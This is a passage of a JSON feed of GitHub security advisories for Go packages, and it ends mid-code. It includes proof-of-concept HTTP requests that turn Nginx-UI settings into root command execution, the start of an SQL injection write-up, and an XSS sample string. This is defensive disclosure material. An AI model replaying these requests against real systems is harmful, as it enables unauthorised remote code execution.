href=\"https://github.com/cometbft/cometbft/commit/5fbc97378b94b0945febe9549399e7c9c5df13ed\">https://github.com/cometbft/cometbft/commit/5fbc97378b94b0945febe9549399e7c9c5df13ed</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qr8r-m495-7hc4\">https://github.com/advisories/GHSA-qr8r-m495-7hc4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qr8r-m495-7hc4",
            "title": "[github.com/cometbft/cometbft] Validation of `VoteExtensionsEnableHeight` can cause chain halt in Go package github.com/cometbft/cometbft",
            "date_modified": "2024-01-19T15:28:45.000Z",
            "date_published": "2024-01-19T15:28:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qr8r-m495-7hc4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>On some platforms, when an attacker can time decapsulation of Kyber on forged cipher texts, they could possibly learn (parts of) the secret key.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/kudelskisecurity/crystals-go/pull/21\">https://github.com/kudelskisecurity/crystals-go/pull/21</a></p>\n<h3 id=\"note\">Note</h3>\n<p>This library was written as part of a MsC student project in the Cybersecurity Team at Kudelski Security. It is not actively maintained anymore. It is only intended for research and testing. We discourage its use in any production environment. Kudelski Security does not use this library as part of their commercial offers or product. This has now been clarified on the project's README.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo</a>\n<a href=\"http://kyberslash.cr.yp.to/\">http://kyberslash.cr.yp.to/</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kudelskisecurity/crystals-go/security/advisories/GHSA-f6jh-hvg2-9525\">https://github.com/kudelskisecurity/crystals-go/security/advisories/GHSA-f6jh-hvg2-9525</a></li>\n<li><a href=\"https://github.com/kudelskisecurity/crystals-go/issues/19\">https://github.com/kudelskisecurity/crystals-go/issues/19</a></li>\n<li><a href=\"https://github.com/kudelskisecurity/crystals-go/pull/20\">https://github.com/kudelskisecurity/crystals-go/pull/20</a></li>\n<li><a href=\"https://github.com/kudelskisecurity/crystals-go/pull/21\">https://github.com/kudelskisecurity/crystals-go/pull/21</a></li>\n<li><a href=\"https://github.com/kudelskisecurity/crystals-go/commit/2a6ca2d4e64d18dd6e8fbb4e48e22c2510118505\">https://github.com/kudelskisecurity/crystals-go/commit/2a6ca2d4e64d18dd6e8fbb4e48e22c2510118505</a></li>\n<li><a href=\"https://kyberslash.cr.yp.to/faq\">https://kyberslash.cr.yp.to/faq</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f6jh-hvg2-9525\">https://github.com/advisories/GHSA-f6jh-hvg2-9525</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f6jh-hvg2-9525",
            "title": "[github.com/kudelskisecurity/crystals-go] crystals-go vulnerable to KyberSlash (timing side-channel attack for Kyber)",
            "date_modified": "2024-01-17T22:06:20.000Z",
            "date_published": "2024-01-17T22:06:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f6jh-hvg2-9525"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"withdrawn-advisory\">Withdrawn Advisory</h2>\n<p>This advisory has been withdrawn because the vulnerability affects a binary, not a library in a <a href=\"https://github.com/github/advisory-database#supported-ecosystems\">supported ecosystem</a>. Therefore, users of the library should not receive alerts. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<h3 id=\"impact\">Impact</h3>\n<p>Agents running on macOS could be susceptible to unexpected code execution through user supplied environment variables.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in versions 14.2.4, 13.4.13 and 12.4.31.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Fix PR: <a href=\"https://github.com/gravitational/teleport/pull/36132\">https://github.com/gravitational/teleport/pull/36132</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gravitational/teleport/security/advisories/GHSA-vfxf-76hv-v4w4\">https://github.com/gravitational/teleport/security/advisories/GHSA-vfxf-76hv-v4w4</a></li>\n<li><a href=\"https://github.com/gravitational/teleport/pull/36132\">https://github.com/gravitational/teleport/pull/36132</a></li>\n<li><a href=\"https://github.com/gravitational/teleport/commit/fcc97de9f99dfec8696ecfd620672a26f29cf9ac\">https://github.com/gravitational/teleport/commit/fcc97de9f99dfec8696ecfd620672a26f29cf9ac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfxf-76hv-v4w4\">https://github.com/advisories/GHSA-vfxf-76hv-v4w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfxf-76hv-v4w4",
            "title": "[github.com/gravitational/teleport] User-provided environment values allow execution on macOS agents",
            "date_modified": "2024-01-23T12:49:54.000Z",
            "date_published": "2024-01-03T21:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfxf-76hv-v4w4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"withdrawn-advisory\">Withdrawn Advisory</h2>\n<p>This advisory has been withdrawn because the vulnerability affects a binary, not a library in a <a href=\"https://github.com/github/advisory-database#supported-ecosystems\">supported ecosystem</a>. Therefore, users of the library should not receive alerts. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<h3 id=\"impact\">Impact</h3>\n<p>Agents running on macOS could be susceptible to unexpected code execution through user supplied environment variables.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in versions 14.2.4, 13.4.13 and 12.4.31.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Fix PR: <a href=\"https://github.com/gravitational/teleport/pull/36132\">https://github.com/gravitational/teleport/pull/36132</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gravitational/teleport/security/advisories/GHSA-vfxf-76hv-v4w4\">https://github.com/gravitational/teleport/security/advisories/GHSA-vfxf-76hv-v4w4</a></li>\n<li><a href=\"https://github.com/gravitational/teleport/pull/36132\">https://github.com/gravitational/teleport/pull/36132</a></li>\n<li><a href=\"https://github.com/gravitational/teleport/commit/fcc97de9f99dfec8696ecfd620672a26f29cf9ac\">https://github.com/gravitational/teleport/commit/fcc97de9f99dfec8696ecfd620672a26f29cf9ac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfxf-76hv-v4w4\">https://github.com/advisories/GHSA-vfxf-76hv-v4w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfxf-76hv-v4w4",
            "title": "[github.com/gravitational/teleport] User-provided environment values allow execution on macOS agents",
            "date_modified": "2024-01-23T12:49:54.000Z",
            "date_published": "2024-01-03T21:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfxf-76hv-v4w4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"withdrawn-advisory\">Withdrawn Advisory</h2>\n<p>This advisory has been withdrawn because the vulnerability affects a binary, not a library in a <a href=\"https://github.com/github/advisory-database#supported-ecosystems\">supported ecosystem</a>. Therefore, users of the library should not receive alerts. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<h3 id=\"impact\">Impact</h3>\n<p>Agents running on macOS could be susceptible to unexpected code execution through user supplied environment variables.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in versions 14.2.4, 13.4.13 and 12.4.31.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Fix PR: <a href=\"https://github.com/gravitational/teleport/pull/36132\">https://github.com/gravitational/teleport/pull/36132</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gravitational/teleport/security/advisories/GHSA-vfxf-76hv-v4w4\">https://github.com/gravitational/teleport/security/advisories/GHSA-vfxf-76hv-v4w4</a></li>\n<li><a href=\"https://github.com/gravitational/teleport/pull/36132\">https://github.com/gravitational/teleport/pull/36132</a></li>\n<li><a href=\"https://github.com/gravitational/teleport/commit/fcc97de9f99dfec8696ecfd620672a26f29cf9ac\">https://github.com/gravitational/teleport/commit/fcc97de9f99dfec8696ecfd620672a26f29cf9ac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfxf-76hv-v4w4\">https://github.com/advisories/GHSA-vfxf-76hv-v4w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfxf-76hv-v4w4",
            "title": "[github.com/gravitational/teleport] User-provided environment values allow execution on macOS agents",
            "date_modified": "2024-01-23T12:49:54.000Z",
            "date_published": "2024-01-03T21:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfxf-76hv-v4w4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Race condition in snap-confine's must_mkdir_and_open_with_perms()</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3328\">https://nvd.nist.gov/vuln/detail/CVE-2022-3328</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3328\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3328</a></li>\n<li><a href=\"https://ubuntu.com/security/notices/USN-5753-1\">https://ubuntu.com/security/notices/USN-5753-1</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/12380\">https://github.com/snapcore/snapd/pull/12380</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/21ebc51f00b8a1417888faa2e83a372fd29d0f5e\">https://github.com/snapcore/snapd/commit/21ebc51f00b8a1417888faa2e83a372fd29d0f5e</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/6226cdc57052f4b7057d92f2e549aa169e35cd2d\">https://github.com/snapcore/snapd/commit/6226cdc57052f4b7057d92f2e549aa169e35cd2d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjqf-877p-7m3f\">https://github.com/advisories/GHSA-cjqf-877p-7m3f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjqf-877p-7m3f",
            "title": "[github.com/snapcore/snapd] snapd Race Condition vulnerability",
            "date_modified": "2024-01-12T21:19:39.000Z",
            "date_published": "2024-01-08T18:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjqf-877p-7m3f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><strong>Vulnerability Type:</strong> Cross-Site Scripting (XSS)<br><strong>Affected Users:</strong> All users of the Django template engine for Fiber prior to the patch. This vulnerability specifically impacts web applications that render user-supplied data through this template engine, potentially leading to the execution of malicious scripts in users' browsers when visiting affected web pages.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been addressed. The template engine now defaults to having autoescape set to <code>true</code>, effectively mitigating the risk of XSS attacks. Users are advised to upgrade to the latest version of the Django template engine for Fiber, where this security update is implemented. Ensure that the version of the template engine being used is the latest, post-patch version.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For users unable to upgrade immediately to the patched version, a workaround involves manually implementing autoescaping within individual Django templates. This method includes adding specific tags in the template to control autoescape behavior:</p>\n<pre><code class=\"language-django\">{% autoescape on %}\n{{ \"&lt;script&gt;alert('xss');&lt;/script&gt;\" }}\n{% endautoescape %}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Official documentation of the Django template engine for Fiber: <a href=\"https://docs.gofiber.io/template/django/\">https://docs.gofiber.io/template/django/</a></li>\n<li>Django built-in template tags: <a href=\"https://docs.djangoproject.com/en/5.0/ref/templates/builtins/\">https://docs.djangoproject.com/en/5.0/ref/templates/builtins/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gofiber/template/security/advisories/GHSA-4mq2-gc4j-cmw6\">https://github.com/gofiber/template/security/advisories/GHSA-4mq2-gc4j-cmw6</a></li>\n<li><a href=\"https://github.com/gofiber/template/commit/28cff3ac4d4c117ab25b5396954676d624b6cb46\">https://github.com/gofiber/template/commit/28cff3ac4d4c117ab25b5396954676d624b6cb46</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22199\">https://nvd.nist.gov/vuln/detail/CVE-2024-22199</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mq2-gc4j-cmw6\">https://github.com/advisories/GHSA-4mq2-gc4j-cmw6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mq2-gc4j-cmw6",
            "title": "[github.com/gofiber/template/django/v3] Django Template Engine Vulnerable to XSS",
            "date_modified": "2024-01-11T19:00:53.000Z",
            "date_published": "2024-01-11T16:41:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mq2-gc4j-cmw6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Nginx-UI is a web interface to manage Nginx configurations. It is vulnerable to arbitrary command execution by abusing the configuration settings.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>Home &gt; Preference</code> page exposes a list of system settings such as <code>Run Mode</code>, <code>Jwt Secret</code>, <code>Node Secret</code> and <code>Terminal Start Command</code>. The latter is used to specify the command to be executed when a user opens a terminal from the web interface. While the UI doesn't allow users to modify the <code>Terminal Start Command</code> setting, it is possible to do so by sending a request to the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13\">API</a>.</p>\n<pre><code class=\"language-go\">func InitPrivateRouter(r *gin.RouterGroup) {\n    r.GET(\"settings\", GetSettings)\n    r.POST(\"settings\", SaveSettings)\n    ...\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\"><code>SaveSettings</code></a> function is used to save the settings. It is protected by the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\"><code>authRequired</code></a> middleware, which requires a valid JWT token or a <code>X-Node-Secret</code> which must equal the <code>Node Secret</code> configuration value. However, given the lack of authorization roles, any authenticated user can modify the settings.</p>\n<p>The <code>SaveSettings</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        ...\n    }\n\n    ...\n\n    settings.ServerSettings = json.Server\n\n    ...\n\n    err := settings.Save()\n    ...\n}\n</code></pre>\n<p>The <code>Terminal Start Command</code> setting is stored as <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/server.go#L12\"><code>settings.ServerSettings.StartCmd</code></a>. By spawning a terminal with <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/terminal/pty.go#L11\"><code>Pty</code></a>, the <code>StartCmd</code> setting is used:</p>\n<pre><code class=\"language-go\">func Pty(c *gin.Context) {\n    ...\n\n    p, err := pty.NewPipeLine(ws)\n\n    ...\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/pty/pipeline.go#L29\"><code>NewPipeLine</code></a> function is defined as follows:</p>\n<pre><code class=\"language-go\">func NewPipeLine(conn *websocket.Conn) (p *Pipeline, err error) {\n    c := exec.Command(settings.ServerSettings.StartCmd)\n\n    ...\n</code></pre>\n<p>This issue was found using CodeQL for Go: <a href=\"https://codeql.github.com/codeql-query-help/go/go-command-injection/\">Command built from user-controlled sources</a>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<blockquote>\n<p>Based on <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210\">this setup</a> using <code>uozi/nginx-ui:v2.0.0-beta.7</code>.</p>\n</blockquote>\n<ol>\n<li>Login as a newly created user.</li>\n<li>Send the following request to modify the settings with <code>\"start_cmd\":\"bash\"</code> :</li>\n</ol>\n<pre><code class=\"language-http\">POST /api/settings HTTP/1.1\nHost: 127.0.0.1:8080\nContent-Length: 512\nAuthorization: &lt;&lt;JWT TOKEN&gt;&gt;\nContent-Type: application/json\n\n{\"nginx\":{\"access_log_path\":\"\",\"error_log_path\":\"\",\"config_dir\":\"\",\"pid_path\":\"\",\"test_config_cmd\":\"\",\"reload_cmd\":\"\",\"restart_cmd\":\"\"},\"openai\":{\"base_url\":\"\",\"token\":\"\",\"proxy\":\"\",\"model\":\"\"},\"server\":{\"http_host\":\"0.0.0.0\",\"http_port\":\"9000\",\"run_mode\":\"debug\",\"jwt_secret\":\"...\",\"node_secret\":\"...\",\"http_challenge_port\":\"9180\",\"email\":\"...\",\"database\":\"foo\",\"start_cmd\":\"bash\",\"ca_dir\":\"\",\"demo\":false,\"page_size\":10,\"github_proxy\":\"\"}}\n</code></pre>\n<ol start=\"3\">\n<li>Open a terminal from the web interface and execute arbitrary commands as <code>root</code>:</li>\n</ol>\n<pre><code>root@1de46642d108:/app# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3\">https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/terminal/pty.go#L11\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/terminal/pty.go#L11</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/pty/pipeline.go#L29\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/pty/pipeline.go#L29</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/server.go#L12\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/server.go#L12</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22198\">https://nvd.nist.gov/vuln/detail/CVE-2024-22198</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8r25-68wm-jw35\">https://github.com/advisories/GHSA-8r25-68wm-jw35</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8r25-68wm-jw35",
            "title": "[github.com/0xJacky/Nginx-UI] Authenticated (user role) arbitrary command execution by modifying `start_cmd` setting (GHSL-2023-268)",
            "date_modified": "2024-01-11T21:43:14.000Z",
            "date_published": "2024-01-11T16:32:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8r25-68wm-jw35"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>Home &gt; Preference</code> page exposes a small list of nginx settings such as <code>Nginx Access Log Path</code> and <code>Nginx Error Log Path</code>. However, the API also exposes <code>test_config_cmd</code>, <code>reload_cmd</code> and <code>restart_cmd</code>. While the UI doesn't allow users to modify any of these settings, it is possible to do so by sending a request to the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13\">API</a>.</p>\n<pre><code class=\"language-go\">func InitPrivateRouter(r *gin.RouterGroup) {\n    r.GET(\"settings\", GetSettings)\n    r.POST(\"settings\", SaveSettings)\n    ...\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\"><code>SaveSettings</code></a> function is used to save the settings. It is protected by the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\"><code>authRequired</code></a> middleware, which requires a valid JWT token or a <code>X-Node-Secret</code> which must equal the <code>Node Secret</code> configuration value. However, given the lack of authorization roles, any authenticated user can modify the settings.\nThe <code>SaveSettings</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func SaveSettings(c *gin.Context) {\n    var json struct {\n        ...\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        ...\n    }\n\n    ...\n\n    settings.NginxSettings = json.Nginx\n\n    ...\n\n    err := settings.Save()\n    ...\n}\n</code></pre>\n<p>The <code>test_config_cmd</code> setting is stored as <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/nginx.go#L8\"><code>settings.NginxSettings.TestConfigCmd</code></a>. When the application wants to test the nginx configuration, it uses the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/nginx/nginx.go#L26\"><code>TestConf</code></a> function:</p>\n<pre><code class=\"language-go\">func TestConf() (out string) {\n    if settings.NginxSettings.TestConfigCmd != \"\" {\n        out = execShell(settings.NginxSettings.TestConfigCmd)\n\n        return\n    }\n\n    out = execCommand(\"nginx\", \"-t\")\n\n    return\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/nginx/nginx.go#L8\"><code>execShell</code></a> function is defined as follows:</p>\n<pre><code class=\"language-go\">func execShell(cmd string) (out string) {\n    bytes, err := exec.Command(\"/bin/sh\", \"-c\", cmd).CombinedOutput()\n    out = string(bytes)\n    if err != nil {\n        out += \" \" + err.Error()\n    }\n    return\n}\n</code></pre>\n<p>Where the <code>cmd</code> argument is user-controlled and is passed to <code>/bin/sh -c</code>.\nThis issue was found using CodeQL for Go: <a href=\"https://codeql.github.com/codeql-query-help/go/go-command-injection/\">Command built from user-controlled sources</a>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<blockquote>\n<p>Based on <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210\">this setup</a> using <code>uozi/nginx-ui:v2.0.0-beta.7</code>.</p>\n</blockquote>\n<ol>\n<li>Login as a newly created user.</li>\n<li>Send the following request to modify the settings with <code>\"test_config_cmd\":\"touch /tmp/pwned\"</code>.</li>\n</ol>\n<pre><code class=\"language-http\">POST /api/settings HTTP/1.1\nHost: 127.0.0.1:8080\nContent-Length: 528\nAuthorization: &lt;&lt;JWT TOKEN&gt;\nContent-Type: application/json\n\n{\"nginx\":{\"access_log_path\":\"\",\"error_log_path\":\"\",\"config_dir\":\"\",\"pid_path\":\"\",\"test_config_cmd\":\"touch /tmp/pwned\",\"reload_cmd\":\"\",\"restart_cmd\":\"\"},\"openai\":{\"base_url\":\"\",\"token\":\"\",\"proxy\":\"\",\"model\":\"\"},\"server\":{\"http_host\":\"0.0.0.0\",\"http_port\":\"9000\",\"run_mode\":\"debug\",\"jwt_secret\":\"foo\",\"node_secret\":\"foo\",\"http_challenge_port\":\"9180\",\"email\":\"foo\",\"database\":\"foo\",\"start_cmd\":\"\",\"ca_dir\":\"\",\"demo\":false,\"page_size\":10,\"github_proxy\":\"\"}}\n</code></pre>\n<ol start=\"3\">\n<li>Add a new site in <code>Home &gt; Manage Sites &gt; Add Site</code> with random data. The previously-modified <code>test_config_cmd</code> setting will be used <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/sites/domain.go#L256\">when the application tries to test the nginx configuration</a>.</li>\n<li>Verify that <code>/tmp/pwned</code> exists.</li>\n</ol>\n<pre><code>$ docker exec -it $(docker ps -q) ls -al /tmp\n-rw-r--r-- 1 root root    0 Dec 14 21:10 pwned\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3\">https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22197\">https://nvd.nist.gov/vuln/detail/CVE-2024-22197</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pxmr-q2x3-9x9m\">https://github.com/advisories/GHSA-pxmr-q2x3-9x9m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pxmr-q2x3-9x9m",
            "title": "[github.com/0xJacky/Nginx-UI] Authenticated (user role) remote command execution by modifying `nginx` settings (GHSL-2023-269)",
            "date_modified": "2024-01-11T19:00:48.000Z",
            "date_published": "2024-01-11T16:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pxmr-q2x3-9x9m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L99C4\"><code>OrderAndPaginate</code></a> function is used to order and paginate data. It is defined as follows:</p>\n<pre><code class=\"language-go\">func OrderAndPaginate(c *gin.Context) func(db *gorm.DB) *gorm.DB {\n    return func(db *gorm.DB) *gorm.DB {\n        sort := c.DefaultQuery(\"order\", \"desc\")\n\n        order := fmt.Sprintf(\"`%s` %s\", DefaultQuery(c, \"sort_by\", \"id\"), sort)\n        db = db.Order(order)\n\n        ...\n    }\n}\n</code></pre>\n<p>By using <a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L278-L287\"><code>DefaultQuery</code></a>, the <code>\"desc\"</code> and <code>\"id\"</code> values are used as default values if the query parameters are not set. Thus, the <code>order</code> and <code>sort_by</code> query parameter are user-controlled and are being appended to the <code>order</code> variable without any sanitization.\nThe same happens with <a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L91\"><code>SortOrder</code></a>, but it doesn't seem to be used anywhere.</p>\n<pre><code class=\"language-go\">func SortOrder(c *gin.Context) func(db *gorm.DB) *gorm.DB {\n    return func(db *gorm.DB) *gorm.DB {\n        sort := c.DefaultQuery(\"order\", \"desc\")\n        order := fmt.Sprintf(\"`%s` %s\", DefaultQuery(c, \"sort_by\", \"id\"), sort)\n        return db.Order(order)\n    }\n}\n</code></pre>\n<p>This issue was found using CodeQL for Go: <a href=\"https://codeql.github.com/codeql-query-help/go/go-sql-injection/\">Database query built from user-controlled sources</a>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<blockquote>\n<p>Based on <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210\">this setup</a> using <code>uozi/nginx-ui:v2.0.0-beta.7</code>.\nIn order to exploit this issue, we need to find a place where the <code>OrderAndPaginate</code> function is used. We can find it in the <code>GET /api/dns_credentials</code> endpoint.</p>\n</blockquote>\n<pre><code class=\"language-go\">func GetDnsCredentialList(c *gin.Context) {\n    